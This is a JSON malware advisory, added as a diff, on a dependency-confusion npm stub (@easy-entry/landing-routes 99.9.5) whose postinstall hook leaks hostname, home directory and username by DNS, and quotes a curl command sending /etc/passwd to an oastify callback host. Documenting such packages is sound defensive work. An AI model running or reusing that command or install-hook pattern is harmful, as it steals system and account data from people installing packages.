@@ -1,0 +1,56 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-1222",
+  "aliases": [
+    "MAL-2026-5408"
+  ],
+  "modified": "2026-05-29T21:45:42Z",
+  "published": "2026-05-29T15:31:04Z",
+  "summary": "Security-research / proof-of-concept package: @easy-entry/landing-routes (npm)",
+  "details": "Dependency-confusion stub: @easy-entry/landing-routes uses sentinel version 99.9.5, a 593-byte tarball with no README or repo. A postinstall hook runs two-stage exfil: (1) node scripts/scream3gg.js captures os.hostname(), os.homedir(), and os.userInfo().username, hex-encodes them, and exfiltrates via DNS subdomain to an oastify[.]com OOB callback host; (2) /usr/bin/curl --data '@/etc/passwd' $(hostname).oastify[.]com leaks /etc/passwd tagged with the hostname. Double-barrel exfiltration: system fingerprint plus credential-surface theft via the passwd file. A @easy-entry-scoped stub (version 99.9.5, two files, 593 bytes) with a postinstall hook that performs two-stage exfiltration: scripts/scream3gg.js hex-encodes hostname/homedir/username and beacons to an oastify[.]com subdomain via fetch, then curl pipes /etc/passwd to a second oastify[.]com subdomain keyed by hostname.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@easy-entry/landing-routes",
+        "purl": "pkg:npm/%40easy-entry/landing-routes@99.9.5"
+      },
+      "versions": [
+        "99.9.5"
+      ],
+      "database_specific": {
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@easy-entry/landing-routes/v/99.9.5"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-1222"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "research_poc",
+      "first_seen_at": "2026-05-29T15:31:04Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "oastify[.]com"
+        ]
+      }
+    }
+  }
+}
